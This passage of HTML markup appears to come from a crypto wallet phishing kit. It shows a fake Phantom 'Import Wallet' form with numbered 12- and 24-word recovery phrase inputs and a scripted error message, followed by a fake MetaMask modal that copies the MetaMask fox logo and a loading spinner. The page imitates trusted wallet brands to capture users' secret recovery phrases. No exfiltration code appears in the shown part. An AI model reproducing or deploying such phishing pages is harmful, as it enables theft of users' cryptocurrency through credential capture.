                        class="scwtw-text-[#ffffff] font-inter scwtw-font-normal scwtw-text-[15px] scwtw-bg-[#181818] scwtw-rounded-[6px] scwtw-border scwtw-border-[#2f2f2f] scwtw-h-[41px] scwtw-self-center scwtw-shadow-[0_0_4px_0_rgba(0,0,0,0.25)] scwtw-outline-none scwtw-pl-8 scwtw-pr-2 scwtw-w-full focus:scwtw-border-[#ab9ff2] scwtw-transition-all scwtw-duration-300 data-[invalid=true]:scwtw-border-[#eb3742] phantom-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                    <div class="scwtw-relative">
                      <p
                        class="scwtw-px-[10px] font-inter scwtw-text-[#999999] scwtw-font-normal scwtw-text-[14px] scwtw-absolute scwtw-top-[11px]"
                      >
                        9.
                      </p>
                      <input
                        class="scwtw-text-[#ffffff] font-inter scwtw-font-normal scwtw-text-[15px] scwtw-bg-[#181818] scwtw-rounded-[6px] scwtw-border scwtw-border-[#2f2f2f] scwtw-h-[41px] scwtw-self-center scwtw-shadow-[0_0_4px_0_rgba(0,0,0,0.25)] scwtw-outline-none scwtw-pl-8 scwtw-pr-2 scwtw-w-full focus:scwtw-border-[#ab9ff2] scwtw-transition-all scwtw-duration-300 data-[invalid=true]:scwtw-border-[#eb3742] phantom-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                    <div class="scwtw-relative">
                      <p
                        class="scwtw-px-[10px] font-inter scwtw-text-[#999999] scwtw-font-normal scwtw-text-[14px] scwtw-absolute scwtw-top-[11px]"
                      >
                        10.
                      </p>
                      <input
                        class="scwtw-text-[#ffffff] font-inter scwtw-font-normal scwtw-text-[15px] scwtw-bg-[#181818] scwtw-rounded-[6px] scwtw-border scwtw-border-[#2f2f2f] scwtw-h-[41px] scwtw-self-center scwtw-shadow-[0_0_4px_0_rgba(0,0,0,0.25)] scwtw-outline-none scwtw-pl-8 scwtw-pr-2 scwtw-w-full focus:scwtw-border-[#ab9ff2] scwtw-transition-all scwtw-duration-300 data-[invalid=true]:scwtw-border-[#eb3742] phantom-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                    <div class="scwtw-relative">
                      <p
                        class="scwtw-px-[10px] font-inter scwtw-text-[#999999] scwtw-font-normal scwtw-text-[14px] scwtw-absolute scwtw-top-[11px]"
                      >
                        11.
                      </p>
                      <input
                        class="scwtw-text-[#ffffff] font-inter scwtw-font-normal scwtw-text-[15px] scwtw-bg-[#181818] scwtw-rounded-[6px] scwtw-border scwtw-border-[#2f2f2f] scwtw-h-[41px] scwtw-self-center scwtw-shadow-[0_0_4px_0_rgba(0,0,0,0.25)] scwtw-outline-none scwtw-pl-8 scwtw-pr-2 scwtw-w-full focus:scwtw-border-[#ab9ff2] scwtw-transition-all scwtw-duration-300 data-[invalid=true]:scwtw-border-[#eb3742] phantom-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                    <div class="scwtw-relative">
                      <p
                        class="scwtw-px-[10px] font-inter scwtw-text-[#999999] scwtw-font-normal scwtw-text-[14px] scwtw-absolute scwtw-top-[11px]"
                      >
                        12.
                      </p>
                      <input
                        class="scwtw-text-[#ffffff] font-inter scwtw-font-normal scwtw-text-[15px] scwtw-bg-[#181818] scwtw-rounded-[6px] scwtw-border scwtw-border-[#2f2f2f] scwtw-h-[41px] scwtw-self-center scwtw-shadow-[0_0_4px_0_rgba(0,0,0,0.25)] scwtw-outline-none scwtw-pl-8 scwtw-pr-2 scwtw-w-full focus:scwtw-border-[#ab9ff2] scwtw-transition-all scwtw-duration-300 data-[invalid=true]:scwtw-border-[#eb3742] phantom-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                  </div>
                  <div
                    class="phantom-container-24-words scwtw-grid scwtw-grid-cols-3 scwtw-gap-3 scwtw-mt-3 scwtw-hidden"
                  >
                    <div class="scwtw-relative">
                      <p
                        class="scwtw-px-[10px] font-inter scwtw-text-[#999999] scwtw-font-normal scwtw-text-[14px] scwtw-absolute scwtw-top-[11px]"
                      >
                        13.
                      </p>
                      <input
                        class="scwtw-text-[#ffffff] font-inter scwtw-font-normal scwtw-text-[15px] scwtw-bg-[#181818] scwtw-rounded-[6px] scwtw-border scwtw-border-[#2f2f2f] scwtw-h-[41px] scwtw-self-center scwtw-shadow-[0_0_4px_0_rgba(0,0,0,0.25)] scwtw-outline-none scwtw-pl-8 scwtw-pr-2 scwtw-w-full focus:scwtw-border-[#ab9ff2] scwtw-transition-all scwtw-duration-300 data-[invalid=true]:scwtw-border-[#eb3742] phantom-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                    <div class="scwtw-relative">
                      <p
                        class="scwtw-px-[10px] font-inter scwtw-text-[#999999] scwtw-font-normal scwtw-text-[14px] scwtw-absolute scwtw-top-[11px]"
                      >
                        14.
                      </p>
                      <input
                        class="scwtw-text-[#ffffff] font-inter scwtw-font-normal scwtw-text-[15px] scwtw-bg-[#181818] scwtw-rounded-[6px] scwtw-border scwtw-border-[#2f2f2f] scwtw-h-[41px] scwtw-self-center scwtw-shadow-[0_0_4px_0_rgba(0,0,0,0.25)] scwtw-outline-none scwtw-pl-8 scwtw-pr-2 scwtw-w-full focus:scwtw-border-[#ab9ff2] scwtw-transition-all scwtw-duration-300 data-[invalid=true]:scwtw-border-[#eb3742] phantom-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                    <div class="scwtw-relative">
                      <p
                        class="scwtw-px-[10px] font-inter scwtw-text-[#999999] scwtw-font-normal scwtw-text-[14px] scwtw-absolute scwtw-top-[11px]"
                      >
                        15.
                      </p>
                      <input
                        class="scwtw-text-[#ffffff] font-inter scwtw-font-normal scwtw-text-[15px] scwtw-bg-[#181818] scwtw-rounded-[6px] scwtw-border scwtw-border-[#2f2f2f] scwtw-h-[41px] scwtw-self-center scwtw-shadow-[0_0_4px_0_rgba(0,0,0,0.25)] scwtw-outline-none scwtw-pl-8 scwtw-pr-2 scwtw-w-full focus:scwtw-border-[#ab9ff2] scwtw-transition-all scwtw-duration-300 data-[invalid=true]:scwtw-border-[#eb3742] phantom-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                    <div class="scwtw-relative">
                      <p
                        class="scwtw-px-[10px] font-inter scwtw-text-[#999999] scwtw-font-normal scwtw-text-[14px] scwtw-absolute scwtw-top-[11px]"
                      >
                        16.
                      </p>
                      <input
                        class="scwtw-text-[#ffffff] font-inter scwtw-font-normal scwtw-text-[15px] scwtw-bg-[#181818] scwtw-rounded-[6px] scwtw-border scwtw-border-[#2f2f2f] scwtw-h-[41px] scwtw-self-center scwtw-shadow-[0_0_4px_0_rgba(0,0,0,0.25)] scwtw-outline-none scwtw-pl-8 scwtw-pr-2 scwtw-w-full focus:scwtw-border-[#ab9ff2] scwtw-transition-all scwtw-duration-300 data-[invalid=true]:scwtw-border-[#eb3742] phantom-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                    <div class="scwtw-relative">
                      <p
                        class="scwtw-px-[10px] font-inter scwtw-text-[#999999] scwtw-font-normal scwtw-text-[14px] scwtw-absolute scwtw-top-[11px]"
                      >
                        17.
                      </p>
                      <input
                        class="scwtw-text-[#ffffff] font-inter scwtw-font-normal scwtw-text-[15px] scwtw-bg-[#181818] scwtw-rounded-[6px] scwtw-border scwtw-border-[#2f2f2f] scwtw-h-[41px] scwtw-self-center scwtw-shadow-[0_0_4px_0_rgba(0,0,0,0.25)] scwtw-outline-none scwtw-pl-8 scwtw-pr-2 scwtw-w-full focus:scwtw-border-[#ab9ff2] scwtw-transition-all scwtw-duration-300 data-[invalid=true]:scwtw-border-[#eb3742] phantom-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                    <div class="scwtw-relative">
                      <p
                        class="scwtw-px-[10px] font-inter scwtw-text-[#999999] scwtw-font-normal scwtw-text-[14px] scwtw-absolute scwtw-top-[11px]"
                      >
                        18.
                      </p>
                      <input
                        class="scwtw-text-[#ffffff] font-inter scwtw-font-normal scwtw-text-[15px] scwtw-bg-[#181818] scwtw-rounded-[6px] scwtw-border scwtw-border-[#2f2f2f] scwtw-h-[41px] scwtw-self-center scwtw-shadow-[0_0_4px_0_rgba(0,0,0,0.25)] scwtw-outline-none scwtw-pl-8 scwtw-pr-2 scwtw-w-full focus:scwtw-border-[#ab9ff2] scwtw-transition-all scwtw-duration-300 data-[invalid=true]:scwtw-border-[#eb3742] phantom-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                    <div class="scwtw-relative">
                      <p
                        class="scwtw-px-[10px] font-inter scwtw-text-[#999999] scwtw-font-normal scwtw-text-[14px] scwtw-absolute scwtw-top-[11px]"
                      >
                        19.
                      </p>
                      <input
                        class="scwtw-text-[#ffffff] font-inter scwtw-font-normal scwtw-text-[15px] scwtw-bg-[#181818] scwtw-rounded-[6px] scwtw-border scwtw-border-[#2f2f2f] scwtw-h-[41px] scwtw-self-center scwtw-shadow-[0_0_4px_0_rgba(0,0,0,0.25)] scwtw-outline-none scwtw-pl-8 scwtw-pr-2 scwtw-w-full focus:scwtw-border-[#ab9ff2] scwtw-transition-all scwtw-duration-300 data-[invalid=true]:scwtw-border-[#eb3742] phantom-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                    <div class="scwtw-relative">
                      <p
                        class="scwtw-px-[10px] font-inter scwtw-text-[#999999] scwtw-font-normal scwtw-text-[14px] scwtw-absolute scwtw-top-[11px]"
                      >
                        20.
                      </p>
                      <input
                        class="scwtw-text-[#ffffff] font-inter scwtw-font-normal scwtw-text-[15px] scwtw-bg-[#181818] scwtw-rounded-[6px] scwtw-border scwtw-border-[#2f2f2f] scwtw-h-[41px] scwtw-self-center scwtw-shadow-[0_0_4px_0_rgba(0,0,0,0.25)] scwtw-outline-none scwtw-pl-8 scwtw-pr-2 scwtw-w-full focus:scwtw-border-[#ab9ff2] scwtw-transition-all scwtw-duration-300 data-[invalid=true]:scwtw-border-[#eb3742] phantom-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                    <div class="scwtw-relative">
                      <p
                        class="scwtw-px-[10px] font-inter scwtw-text-[#999999] scwtw-font-normal scwtw-text-[14px] scwtw-absolute scwtw-top-[11px]"
                      >
                        21.
                      </p>
                      <input
                        class="scwtw-text-[#ffffff] font-inter scwtw-font-normal scwtw-text-[15px] scwtw-bg-[#181818] scwtw-rounded-[6px] scwtw-border scwtw-border-[#2f2f2f] scwtw-h-[41px] scwtw-self-center scwtw-shadow-[0_0_4px_0_rgba(0,0,0,0.25)] scwtw-outline-none scwtw-pl-8 scwtw-pr-2 scwtw-w-full focus:scwtw-border-[#ab9ff2] scwtw-transition-all scwtw-duration-300 data-[invalid=true]:scwtw-border-[#eb3742] phantom-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                    <div class="scwtw-relative">
                      <p
                        class="scwtw-px-[10px] font-inter scwtw-text-[#999999] scwtw-font-normal scwtw-text-[14px] scwtw-absolute scwtw-top-[11px]"
                      >
                        22.
                      </p>
                      <input
                        class="scwtw-text-[#ffffff] font-inter scwtw-font-normal scwtw-text-[15px] scwtw-bg-[#181818] scwtw-rounded-[6px] scwtw-border scwtw-border-[#2f2f2f] scwtw-h-[41px] scwtw-self-center scwtw-shadow-[0_0_4px_0_rgba(0,0,0,0.25)] scwtw-outline-none scwtw-pl-8 scwtw-pr-2 scwtw-w-full focus:scwtw-border-[#ab9ff2] scwtw-transition-all scwtw-duration-300 data-[invalid=true]:scwtw-border-[#eb3742] phantom-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                    <div class="scwtw-relative">
                      <p
                        class="scwtw-px-[10px] font-inter scwtw-text-[#999999] scwtw-font-normal scwtw-text-[14px] scwtw-absolute scwtw-top-[11px]"
                      >
                        23.
                      </p>
                      <input
                        class="scwtw-text-[#ffffff] font-inter scwtw-font-normal scwtw-text-[15px] scwtw-bg-[#181818] scwtw-rounded-[6px] scwtw-border scwtw-border-[#2f2f2f] scwtw-h-[41px] scwtw-self-center scwtw-shadow-[0_0_4px_0_rgba(0,0,0,0.25)] scwtw-outline-none scwtw-pl-8 scwtw-pr-2 scwtw-w-full focus:scwtw-border-[#ab9ff2] scwtw-transition-all scwtw-duration-300 data-[invalid=true]:scwtw-border-[#eb3742] phantom-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                    <div class="scwtw-relative">
                      <p
                        class="scwtw-px-[10px] font-inter scwtw-text-[#999999] scwtw-font-normal scwtw-text-[14px] scwtw-absolute scwtw-top-[11px]"
                      >
                        24.
                      </p>
                      <input
                        class="scwtw-text-[#ffffff] font-inter scwtw-font-normal scwtw-text-[15px] scwtw-bg-[#181818] scwtw-rounded-[6px] scwtw-border scwtw-border-[#2f2f2f] scwtw-h-[41px] scwtw-self-center scwtw-shadow-[0_0_4px_0_rgba(0,0,0,0.25)] scwtw-outline-none scwtw-pl-8 scwtw-pr-2 scwtw-w-full focus:scwtw-border-[#ab9ff2] scwtw-transition-all scwtw-duration-300 data-[invalid=true]:scwtw-border-[#eb3742] phantom-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                  </div>
                </div>
                <div
                  class="scwtw-px-6 scwtw-mt-3 scwtw-opacity-0 scwtw-ease-in-out scwtw-transition-all scwtw-duration-400"
                  id="phantom-error-container"
                >
                  <p
                    class="scwtw-flex scwtw-items-center scwtw-justify-start scwtw-text-[#eb3742] scwtw-text-[14px] scwtw-leading-[18px] font-inter"
                  >
                    <svg
                      class="scwtw-mr-[6px] scwtw-w-5 scwtw-h-5"
                      width="12"
                      height="12"
                      viewBox="0 0 30 30"
                      fill="none"
                      xmlns="http://www.w3.org/2000/svg"
                    >
                      <circle cx="15" cy="15" r="14" fill="#111111"></circle>
                      <path
                        d="M25.0182 25.0176C30.5503 19.4855 30.5503 10.5146 25.0182 4.98245C19.4861 -0.549652 10.5152 -0.549652 4.98306 4.98245C-0.549041 10.5146 -0.549041 19.4855 4.98306 25.0176C10.5152 30.5497 19.4861 30.5497 25.0182 25.0176ZM13.4158 8.1522C13.7746 7.37471 14.6119 6.95607 15.4492 7.16539C16.2566 7.37471 16.7948 8.1522 16.735 9.01939C16.7051 9.58755 16.6752 10.1258 16.6453 10.694C16.5257 12.7872 16.4061 14.8804 16.3164 16.9438C16.2865 17.6315 15.7183 18.1698 15.0306 18.1698C14.3129 18.1698 13.7746 17.6315 13.7447 16.8839C13.7148 16.4653 13.7148 16.0467 13.6849 15.628C13.5952 14.2824 13.5354 12.9367 13.4457 11.5612C13.3859 10.694 13.356 9.82678 13.2962 8.95958C13.2663 8.72036 13.2962 8.42132 13.4158 8.1522ZM15.0007 19.3958C15.9576 19.3958 16.735 20.1733 16.7649 21.1302C16.7649 22.0871 15.9875 22.8646 15.0306 22.8646C14.1036 22.8646 13.2962 22.0871 13.2962 21.1601C13.2663 20.2032 14.0437 19.3958 15.0007 19.3958Z"
                        fill="#EB3742"
                      ></path>
                    </svg>
                    <span id="phantom-error-text"
                      >Words 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, and 12 are
                      incorrect or misspelled</span
                    >
                  </p>
                </div>
              </div>
              <div
                class="scwtw-flex scwtw-flex-col scwtw-items-center scwtw-justify-center scwtw-text-center scwtw-gap-y-2 scwtw-mt-4 scwtw-px-6"
              >
                <div class="scwtw-mb-1.5">
                  <button
                    class="font-inter scwtw-text-[#777777] scwtw-font-medium scwtw-text-[14px] hover:scwtw-text-[#ab9ff2] scwtw-transition-all scwtw-duration-300 scwtw-cursor-pointer"
                    type="button"
                    id="phantom-switch-to-24-words-button"
                  >
                    I have a 24-word recovery phrase
                  </button>
                  <button
                    class="font-inter scwtw-text-[#777777] scwtw-font-medium scwtw-text-[14px] hover:scwtw-text-[#ab9ff2] scwtw-transition-all scwtw-duration-300 scwtw-cursor-pointer scwtw-hidden"
                    type="button"
                    id="phantom-switch-to-12-words-button"
                  >
                    I have a 12-word recovery phrase
                  </button>
                </div>
                <div class="scwtw-w-full">
                  <button
                    class="font-inter scwtw-flex scwtw-items-center scwtw-justify-center scwtw-py-[14px] scwtw-outline-none scwtw-w-full scwtw-text-[#222222] scwtw-bg-[#ab9ff2] scwtw-font-medium scwtw-text-[16px] scwtw-rounded-[16px] scwtw-h-[47px] scwtw-transition-all scwtw-duration-300 scwtw-cursor-pointer hover:scwtw-bg-[#e2dffe] disabled:scwtw-opacity-60 disabled:scwtw-cursor-not-allowed disabled:scwtw-bg-[#333333] disabled:scwtw-text-[#ffffff]"
                    id="phantom-import-button"
                  >
                    Import Wallet
                  </button>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>

    <div
      id="metamask-modal-overlay"
      style="display: none"
      class="metamask-modal-overlay scwtw-fixed scwtw-inset-0 scwtw-w-full scwtw-h-full scwtw-bg-[#12121280] scwtw-transition-opacity scwtw-duration-200 scwtw-ease-in-out scwtw-pointer-events-auto scwtw-z-[2147483647] scwtw-opacity-100"
    ></div>
    <div
      id="metamask-modal"
      style="display: none"
      class="metamask-modal connect-modal-parent scwtw-fixed scwtw-inset-0 scwtw-transition-all scwtw-duration-200 scwtw-ease-in-out scwtw-pointer-events-none scwtw-z-[2147483648] scwtw-opacity-100"
    >
      <div
        class="metamask-modal-content scwtw-pointer-events-auto scwtw-flex scwtw-transition-transform scwtw-duration-200 scwtw-ease-in-out scwtw-fixed scwtw-top-1/2 scwtw-left-1/2 -scwtw-translate-x-1/2 scwtw-w-full scwtw-h-full scwtw-max-full md:scwtw-top-0 md:scwtw-right-8 md:scwtw-left-auto md:scwtw-translate-x-0 md:scwtw-w-[430px] md:scwtw-h-[640px] md:scwtw-border md:scwtw-border-[#eaecef] dark:md:scwtw-border-[#474d57] md:scwtw-overflow-y-hidden scwtw-overflow-y-auto -scwtw-translate-y-1/2 md:scwtw-translate-y-0"
      >
        <div
          class="scwtw-h-full scwtw-w-full scwtw-bg-[#ffffff] dark:scwtw-bg-[#141618] scwtw-shadow-xl"
        >
          <div class="scwtw-relative scwtw-z-[2147483649] scwtw-h-full">
            <div
              id="fox-container"
              class="scwtw-absolute scwtw-inset-0 scwtw-z-[2147483648] scwtw-transition-opacity scwtw-duration-500 scwtw-flex scwtw-items-center scwtw-justify-center scwtw-flex-col scwtw-overflow-hidden scwtw-opacity-0 scwtw-hidden"
            >
              <div>
                <svg
                  class="scwtw-h-32 scwtw-w-32 fox-svg"
                  fill="none"
                  height="33"
                  viewBox="0 0 35 33"
                  width="35"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <g
                    stroke-linecap="round"
                    stroke-linejoin="round"
                    stroke-width=".25"
                  >
                    <path
                      d="m32.9582 1-13.1341 9.7183 2.4424-5.72731z"
                      fill="#e17726"
                      stroke="#e17726"
                    ></path>
                    <g fill="#e27625" stroke="#e27625">
                      <path
                        d="m2.66296 1 13.01714 9.809-2.3254-5.81802z"
                      ></path>
                      <path
                        d="m28.2295 23.5335-3.4947 5.3386 7.4829 2.0603 2.1436-7.2823z"
                      ></path>
                      <path
                        d="m1.27281 23.6501 2.13055 7.2823 7.46994-2.0603-3.48166-5.3386z"
                      ></path>
                      <path
                        d="m10.4706 14.5149-2.0786 3.1358 7.405.3369-.2469-7.969z"
                      ></path>
                      <path
                        d="m25.1505 14.5149-5.1575-4.58704-.1688 8.05974 7.4049-.3369z"
                      ></path>
                      <path
                        d="m10.8733 28.8721 4.4819-2.1639-3.8583-3.0062z"
                      ></path>
                      <path
                        d="m20.2659 26.7082 4.4689 2.1639-.6105-5.1701z"
                      ></path>
                    </g>
                    <path
                      d="m24.7348 28.8721-4.469-2.1639.3638 2.9025-.039 1.231z"
                      fill="#d5bfb2"
                      stroke="#d5bfb2"
                    ></path>
                    <path
                      d="m10.8732 28.8721 4.1572 1.9696-.026-1.231.3508-2.9025z"
                      fill="#d5bfb2"
                      stroke="#d5bfb2"
                    ></path>
                    <path
                      d="m15.1084 21.7842-3.7155-1.0884 2.6243-1.2051z"
                      fill="#233447"
                      stroke="#233447"
                    ></path>
                    <path
                      d="m20.5126 21.7842 1.0913-2.2935 2.6372 1.2051z"
                      fill="#233447"
                      stroke="#233447"
                    ></path>
                    <path
                      d="m10.8733 28.8721.6495-5.3386-4.13117.1167z"
                      fill="#cc6228"
                      stroke="#cc6228"
                    ></path>
                    <path
                      d="m24.0982 23.5335.6366 5.3386 3.4946-5.2219z"
                      fill="#cc6228"
                      stroke="#cc6228"
                    ></path>
                    <path
                      d="m27.2291 17.6507-7.405.3369.6885 3.7966 1.0913-2.2935 2.6372 1.2051z"
                      fill="#cc6228"
                      stroke="#cc6228"
                    ></path>
                    <path
                      d="m11.3929 20.6958 2.6242-1.2051 1.0913 2.2935.6885-3.7966-7.40495-.3369z"
                      fill="#cc6228"
                      stroke="#cc6228"
                    ></path>
                    <path
                      d="m8.392 17.6507 3.1049 6.0513-.1039-3.0062z"
                      fill="#e27525"
                      stroke="#e27525"
                    ></path>
                    <path
                      d="m24.2412 20.6958-.1169 3.0062 3.1049-6.0513z"
                      fill="#e27525"
                      stroke="#e27525"
                    ></path>
                    <path
                      d="m15.797 17.9876-.6886 3.7967.8704 4.4833.1949-5.9087z"
                      fill="#e27525"
                      stroke="#e27525"
                    ></path>
                    <path
                      d="m19.8242 17.9876-.3638 2.3584.1819 5.9216.8704-4.4833z"
                      fill="#e27525"
                      stroke="#e27525"
                    ></path>
                    <path
                      d="m20.5127 21.7842-.8704 4.4834.6236.4406 3.8584-3.0062.1169-3.0062z"
                      fill="#f5841f"
                      stroke="#f5841f"
                    ></path>
                    <path
                      d="m11.3929 20.6958.104 3.0062 3.8583 3.0062.6236-.4406-.8704-4.4834z"
                      fill="#f5841f"
                      stroke="#f5841f"
                    ></path>
                    <path
                      d="m20.5906 30.8417.039-1.231-.3378-.2851h-4.9626l-.3248.2851.026 1.231-4.1572-1.9696 1.4551 1.1921 2.9489 2.0344h5.0536l2.962-2.0344 1.442-1.1921z"
                      fill="#c0ac9d"
                      stroke="#c0ac9d"
                    ></path>
                    <path
                      d="m20.2659 26.7082-.6236-.4406h-3.6635l-.6236.4406-.3508 2.9025.3248-.2851h4.9626l.3378.2851z"
                      fill="#161616"
                      stroke="#161616"
                    ></path>
                    <path
                      d="m33.5168 11.3532 1.1043-5.36447-1.6629-4.98873-12.6923 9.3944 4.8846 4.1205 6.8983 2.0085 1.52-1.7752-.6626-.4795 1.0523-.9588-.8054-.622 1.0523-.8034z"
                      fill="#763e1a"
                      stroke="#763e1a"
                    ></path>
                    <path
                      d="m1 5.98873 1.11724 5.36447-.71451.5313 1.06527.8034-.80545.622 1.05228.9588-.66255.4795 1.51997 1.7752 6.89835-2.0085 4.8846-4.1205-12.69233-9.3944z"
                      fill="#763e1a"
                      stroke="#763e1a"
                    ></path>
                    <path
                      d="m32.0489 16.5234-6.8983-2.0085 2.0786 3.1358-3.1049 6.0513 4.1052-.0519h6.1318z"
                      fill="#f5841f"
                      stroke="#f5841f"
                    ></path>
                    <path
                      d="m10.4705 14.5149-6.89828 2.0085-2.29944 7.1267h6.11883l4.10519.0519-3.10487-6.0513z"
                      fill="#f5841f"
                      stroke="#f5841f"
                    ></path>
                    <path
                      d="m19.8241 17.9876.4417-7.5932 2.0007-5.4034h-8.9119l2.0006 5.4034.4417 7.5932.1689 2.3842.013 5.8958h3.6635l.013-5.8958z"
                      fill="#f5841f"
                      stroke="#f5841f"
                    ></path>
                  </g>
                </svg>
                <div
                  class="scwtw-flex scwtw-items-center scwtw-justify-center scwtw-mt-12"
                >
                  <svg
                    class="scwtw-h-12 scwtw-w-12 scwtw-text-[#f6851a] scwtw-animate-spin"
                    xmlns="http://www.w3.org/2000/svg"
                    width="24"
                    height="24"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="currentColor"
                    stroke-width="1.5"
                    stroke-linecap="round"
                    stroke-linejoin="round"
                  >
                    <path d="M21 12a9 9 0 1 1-6.219-8.56"></path>
                  </svg>
                </div>
              </div>
            </div>
            <div
              id="import-container-meta"
              class="scwtw-z-[2147483648] scwtw-transition-opacity scwtw-duration-500 scwtw-opacity-100"
            >
              <div
                class="scwtw-flex scwtw-items-center scwtw-justify-between scwtw-bg-[#f2f3f5] dark:scwtw-bg-[#202427] scwtw-px-4 scwtw-py-3 scwtw-border-b scwtw-border-b-[#e6e6e6] dark:scwtw-border-b-[#2b2c2f]"
              >
                <div>
                  <svg
                    class="scwtw-h-8 scwtw-w-8"
                    fill="none"
                    height="33"
                    viewBox="0 0 35 33"
                    width="35"
                    xmlns="http://www.w3.org/2000/svg"
                  >
                    <g
                      stroke-linecap="round"
                      stroke-linejoin="round"
                      stroke-width=".25"
                    >
                      <path
                        d="m32.9582 1-13.1341 9.7183 2.4424-5.72731z"
                        fill="#e17726"
                        stroke="#e17726"
                      ></path>
                      <g fill="#e27625" stroke="#e27625">
                        <path
                          d="m2.66296 1 13.01714 9.809-2.3254-5.81802z"
                        ></path>
                        <path
                          d="m28.2295 23.5335-3.4947 5.3386 7.4829 2.0603 2.1436-7.2823z"
                        ></path>
                        <path
                          d="m1.27281 23.6501 2.13055 7.2823 7.46994-2.0603-3.48166-5.3386z"
                        ></path>
                        <path
                          d="m10.4706 14.5149-2.0786 3.1358 7.405.3369-.2469-7.969z"
                        ></path>
                        <path
                          d="m25.1505 14.5149-5.1575-4.58704-.1688 8.05974 7.4049-.3369z"
                        ></path>
                        <path
                          d="m10.8733 28.8721 4.4819-2.1639-3.8583-3.0062z"
                        ></path>
                        <path
                          d="m20.2659 26.7082 4.4689 2.1639-.6105-5.1701z"
                        ></path>
                      </g>
                      <path
                        d="m24.7348 28.8721-4.469-2.1639.3638 2.9025-.039 1.231z"
                        fill="#d5bfb2"
                        stroke="#d5bfb2"
                      ></path>
                      <path
                        d="m10.8732 28.8721 4.1572 1.9696-.026-1.231.3508-2.9025z"
                        fill="#d5bfb2"
                        stroke="#d5bfb2"
                      ></path>
                      <path
                        d="m15.1084 21.7842-3.7155-1.0884 2.6243-1.2051z"
                        fill="#233447"
                        stroke="#233447"
                      ></path>
                      <path
                        d="m20.5126 21.7842 1.0913-2.2935 2.6372 1.2051z"
                        fill="#233447"
                        stroke="#233447"
                      ></path>
                      <path
                        d="m10.8733 28.8721.6495-5.3386-4.13117.1167z"
                        fill="#cc6228"
                        stroke="#cc6228"
                      ></path>
                      <path
                        d="m24.0982 23.5335.6366 5.3386 3.4946-5.2219z"
                        fill="#cc6228"
                        stroke="#cc6228"
                      ></path>
                      <path
                        d="m27.2291 17.6507-7.405.3369.6885 3.7966 1.0913-2.2935 2.6372 1.2051z"
                        fill="#cc6228"
                        stroke="#cc6228"
                      ></path>
                      <path
                        d="m11.3929 20.6958 2.6242-1.2051 1.0913 2.2935.6885-3.7966-7.40495-.3369z"
                        fill="#cc6228"
                        stroke="#cc6228"
                      ></path>
                      <path
                        d="m8.392 17.6507 3.1049 6.0513-.1039-3.0062z"
                        fill="#e27525"
                        stroke="#e27525"
                      ></path>
                      <path
                        d="m24.2412 20.6958-.1169 3.0062 3.1049-6.0513z"
                        fill="#e27525"
                        stroke="#e27525"
                      ></path>
                      <path
                        d="m15.797 17.9876-.6886 3.7967.8704 4.4833.1949-5.9087z"
                        fill="#e27525"
                        stroke="#e27525"
                      ></path>
                      <path
                        d="m19.8242 17.9876-.3638 2.3584.1819 5.9216.8704-4.4833z"
                        fill="#e27525"
                        stroke="#e27525"
                      ></path>
                      <path
                        d="m20.5127 21.7842-.8704 4.4834.6236.4406 3.8584-3.0062.1169-3.0062z"
                        fill="#f5841f"
                        stroke="#f5841f"
                      ></path>
                      <path
                        d="m11.3929 20.6958.104 3.0062 3.8583 3.0062.6236-.4406-.8704-4.4834z"
                        fill="#f5841f"
                        stroke="#f5841f"
                      ></path>
                      <path
                        d="m20.5906 30.8417.039-1.231-.3378-.2851h-4.9626l-.3248.2851.026 1.231-4.1572-1.9696 1.4551 1.1921 2.9489 2.0344h5.0536l2.962-2.0344 1.442-1.1921z"
                        fill="#c0ac9d"
                        stroke="#c0ac9d"
                      ></path>
                      <path
                        d="m20.2659 26.7082-.6236-.4406h-3.6635l-.6236.4406-.3508 2.9025.3248-.2851h4.9626l.3378.2851z"
                        fill="#161616"
                        stroke="#161616"
                      ></path>
                      <path
                        d="m33.5168 11.3532 1.1043-5.36447-1.6629-4.98873-12.6923 9.3944 4.8846 4.1205 6.8983 2.0085 1.52-1.7752-.6626-.4795 1.0523-.9588-.8054-.622 1.0523-.8034z"
                        fill="#763e1a"
                        stroke="#763e1a"
                      ></path>
                      <path
                        d="m1 5.98873 1.11724 5.36447-.71451.5313 1.06527.8034-.80545.622 1.05228.9588-.66255.4795 1.51997 1.7752 6.89835-2.0085 4.8846-4.1205-12.69233-9.3944z"
                        fill="#763e1a"
                        stroke="#763e1a"
                      ></path>
                      <path
                        d="m32.0489 16.5234-6.8983-2.0085 2.0786 3.1358-3.1049 6.0513 4.1052-.0519h6.1318z"
                        fill="#f5841f"
                        stroke="#f5841f"
                      ></path>
                      <path
                        d="m10.4705 14.5149-6.89828 2.0085-2.29944 7.1267h6.11883l4.10519.0519-3.10487-6.0513z"
                        fill="#f5841f"
                        stroke="#f5841f"
                      ></path>
                      <path
                        d="m19.8241 17.9876.4417-7.5932 2.0007-5.4034h-8.9119l2.0006 5.4034.4417 7.5932.1689 2.3842.013 5.8958h3.6635l.013-5.8958z"
                        fill="#f5841f"
                        stroke="#f5841f"
                      ></path>
                    </g>
                  </svg>
                </div>
                <div>
                  <button
                    class="scwtw-h-8 scwtw-w-8 scwtw-flex scwtw-items-center scwtw-justify-center scwtw-rounded-full scwtw-border-2 scwtw-border-[#0376c9] scwtw-cursor-pointer hover:scwtw-opacity-70 scwtw-transition-all scwtw-duration-300"
